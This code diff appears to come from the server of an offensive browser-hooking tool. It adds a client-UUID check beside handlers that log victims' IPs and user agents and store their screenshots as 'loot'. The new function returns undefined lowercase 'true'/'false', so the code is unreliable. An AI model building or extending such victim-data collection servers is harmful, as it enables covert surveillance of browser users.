@@ -445,6 +445,19 @@ def clientSeen(identifier, ip, userAgent):
 
 
 
+
+
+# Check if the UUID sent by client is valid
+def isClientSessionValid(identifier):
+    client = Client.query.filter_by(uuid=identifier).first()
+    if client:
+        # print("!! Valid client UUID!")
+        return true
+    else:
+        # print("!! Invalid client UUID!")
+        return false
+
+
 # Needed by flask-login
 @login_manager.user_loader
 def user_loader(username):
@@ -691,8 +704,8 @@ def returnUUID():
 def recordScreenshot(identifier):
     # print("Received image from: " + identifier)
     #print("Looking up loot dir...")
-    lootDir = findLootDirectory(identifier)
-    image = request.data
+    lootDir   = findLootDirectory(identifier)
+    image     = request.data
     file_type = magic.from_buffer(image, mime=True)
 
     # Make sure the html2canvas screenshot is 
